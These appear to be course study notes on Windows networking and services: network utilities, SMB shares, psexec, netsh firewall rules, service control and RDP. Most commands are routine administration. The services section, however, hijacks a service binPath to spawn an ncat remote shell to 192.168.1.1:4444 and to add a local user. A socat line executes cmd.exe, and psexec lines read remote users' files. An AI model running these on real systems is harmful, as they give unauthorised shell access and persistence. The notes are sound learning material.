# Windows Networking and Services

In this Module, we will cover the following Learning Units:

* Explain Essential Network Utilities
* Identify Common Clients
* Understand Firewalls
* Describe Services
* Windows Network Practica

`rdesktop -u username p password server-ip`

https://learn.microsoft.com/en-us/windows/
https://en.wikipedia.org/wiki/Windows_service
https://en.wikipedia.org/wiki/Dynamic_Host_Configuration_Protocol

## Essential Network Utilities

* rdesktop Server-IP
* sc
* ping
* tracert
* arp
* netstat
* nslookup
* ipconfig
* route

### Basis System and Network Commands

Show system information of local and remote computers

```
systeminfo
systeminfo /s remote /u user\domain /p password
```

Read and write environment variables

* /s remote server
* /u user
* /p password
* /m **system environment**
* /k assign var with REG KEY

Search environment variable starting with the letter k.

`set k`

```
echo %USERNAME%
set Username
powershell Get-ChildItem env:
set temp=dummy
setx permant "dummy"
setx /s remote /u user\domain /p password permant "dummy"
setx /s remote /u user\domain /p password permant "dummy" /m
setx TZONE /k HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\TimeZoneInformation\StandardName
```

https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/setx

* /s remote server
* /u user
* /p password
* /k specifies a registry key
* /m set system variable

Query or renew IP and display or flush DNS

```
ipconfig /release "ETH Adapter Name"
ipconfig /renew "ETH Adapter Name"
ipconfig /displaydns
ipconfig /flushdns
ipconfig /registerdns
```

## Active connections

The tool nslookup and the hosts file are the resources for name resolution

* DNS uses udp/tcp 53
* NetBios over tcp/ip uses udp/tcp 137, udp 138, tcp 139

More about NBT 

https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/nbtstat

```
nbtstat /n
nbtstat /c
```

NSLookup tools

```
nslookup
> set all
nslookup www.google.com
%SystemRoot%\System32\drivers\etc\hosts
```

Netstat network status

* -a all ports including listing ports
* -n numerical IPs
* -o processes id
* -p protocol TCP,UDP,IP,ICMP, ...

```
>netstat -p TCP -ano
```

ARP views and manipulate ARP entries

* -a entries of all interfaces
* -s add static entries
* -d delete entries


```
arp /a 10.0.0.80
arp /s 10.0.0.80 00-AA-00-4F-2A-9C
arp /d 10.0.0.80
```

Using route, ping, tracert, pathping

*Pathping* works in a very similar fashion, but once it confirms a hop, it will send multiple messages and provide the statistics. Because of that, pathping can be a little more reliable when compared to tracert to provide latency information.

```
route print
route add 1.1.1.1/32
route -p add 1.1.1.2/32 192.168.207.254
ping -a 10.10.10.1 ... resolve hostname by IP
tracert www.offsec.com
pathping www.offsec.com
```

https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/pathping
https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/tracert

* tracert /d  ... do NOT resolve IP addresses
* pathping /n ... do NOT resolve IP addresses
* pathping /q ... number of echo

## Common network clients

### Server Message Block (SMB)

SMB is a network sharing protocol on Windows which known to be very vulnerable that's why attackers will attack it.

* SMB port 139 or tcp 445
* https://www.exploit-db.com/search?q=smb
* SMB permits to share files, printers, serial ports, network browsing and IPC using named pipes
* SMB uses different authentication methods
  * **Kerberos** protocol - authenticate against Active Directory
  * **NTLMv1** protocol - authenticate in peer-to-peer networks
* *Two* Windows services that implement SMB: 
  * **LanmanServer** - serves shares resources
  * **LanmanWorkstation** - help to access shared ressource
* Linux tools that support SMB are samba, moSMB, nq
* Exploits combination for RCE using SMBGhost (CVE-2020-0796) and SMBleed (CVE-2020-1206)


Net share and use allow to create/delete shares add/remove drives from machines on the network 

* /user:user@domain <password>
* /permanent:yes

```
net share
net share mySharedData=C:\Windows\system32
net use \\192.168.1.1\public
net use f: \\finance.example.com\finance 
net use g: \\marketing.example.com\marketing /user:marketing@example.com password /persistent:yes

```

### Netcat and SOCAT

```
client> nc.exe 127.0.0.1 1234
server> nc.exe -n -l -v -s 127.0.0.1 -p 1234
```

```
server> socat.exe -d OPENSSL-LISTEN:5678,cert=offsec.pem, verify=0 STDOUT, bind=127.0.0.1
client> socat.exe OPENSSL:127.0.0.1:5678, verify=0 EXEC=’cmd.exe’
```

## Remote Administration (psexec sysinternals)

* -i \computer
* -i \\IP-addr
* -u domain\user
* -p password
* -s super user nt authority
* cmd /c <command>

https://learn.microsoft.com/en-us/sysinternals/downloads/psexec

```
psexec -i \myComputer cmd /c "systeminfo"
psexec -i \myComputer -u domain\username -p password cmd
psexec -i \myComputer -u domain\username -p password cmd /c "systeminfo"
psexec.exe -i \\192.168.54.100 -u administrator -p remoteadmin cmd

psexec.exe -i \\IP -u user -p password cmd /c "type c:\Users\user\Desktop\file.txt"
psexec.exe -i -s \\IP -u admin -p password cmd /c "type c:\Users\admin\Desktop\file.txt"
```

Unzip files

```
tar -vxf file.zip
psexec.exe -i \\IP -u user -p password cmd /c "tar -vxf file.zip"
```

## Windows Defender Firewall

The netsh command line utility allows to view and manipulate network configuration including local and remote computers.

* -r remote computer
* -u domain\user
* -p password
* -f script file

https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc754516(v=ws.10)
https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd734783(v=ws.10)
AdvFirewall commands - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc771920(v=ws.10)

Reset the firewall

```
netsh firewall ?
netsh advfirewall ?
netsh advfirewall reset
%systemroot%\system32\LogFiles\Firewall\pfirewall.log
```

Show all profiles and activate firewall

* allprofiles
* currentprofile
* domainprofile
* privateprofile
* publicprofile

```
netsh advfirewall show allprofiles
netsh advfirewall show allprofile state
netsh advfirewall set allprofiles state on

```

Add rules to firewall

```
netsh advfirewall firewall add rule name="Deny Ping OffSec" dir=in action=block protocol=icmpv4 remoteip=192.124.249.5
netsh advfirewall firewall show rule name="Deny Ping OffSec"
netsh advfirewall firewall delete rule name="Deny Ping OffSec"
netsh advfirewall firewall add rule name="Block OffSec Website" remoteip=192.124.249.5 dir=out enable=yes action=block remoteport=443 protocol=tcp
netsh advfirewall firewall add rule name="Allow SSH" dir=in action="allow" localport=22 protocol=tcp
```

Export and import firewall policies

```
netsh advfirewall export c:\fwPolicy.wfw
netsh advfirewall reset
netsh advfirewall import c:\fwPolicy.wfw
```

## Windows Services

A windows service is a program that usually runs in the background. They can also run with different permissions, as an unprivileged user, or as SYSTEM. Generally, services run as non-interactive, but we can enable and disable them. 

https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754599(v=ws.11)

Start/Stop and query services status info

```
net stop WSearch
net start WSearch
new view WSearch

sc start WSearch
sc stop WSearch
sc query WSearch
sc description WSearch
sc getdisplayname WSearch
```

Show services information 

https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/tasklist
https://learn.microsoft.com/en-us/sysinternals/downloads/psservice

* tasklist /svc services
* sc query service state info
* sc qc service config like autostart, path name and dependencies
* PsService can be access remote systems, while sc only works locally
  * psservice \\computer
  * -u domain\user
  * -p password
  * start/stop/query/config

```
tasklist /svc
tasklist /svc | find "Dhcp"

sc query Dhcp  
sc qc Dhcp
PsService.exe start WSearch
PsService.exe stop WSearch
PsService.exe query WSearch
PsService.exe config WSearch
PsService setconfig "SNMPTRAP" auto/disabled
```

Interact with services and create new ones

```
sc config Dhcp start=auto
sc config Dhcp start=disabled
sc config Dhcp binPath= "ncat.exe 192.168.1.1 4444 -e cmd.exe"-
sc config test binPath= "net user somebody /add"
sc start test
```

## Remote Desktop

Allow remote desktop connection from windows and linux.

https://en.wikipedia.org/wiki/Remote_Desktop_Protocol

* RDP uses TCP port 3389
* -u user
* -p password
* -d user domain 

```
rdesktop -u offensive -p security 192.168.192.64
```

Get Hostnames

```

nslookup IP
nbtstat -A IP
nmap -v -A IP
psexec -accepteula
psexec -i \\192.168.20.20 hostname
```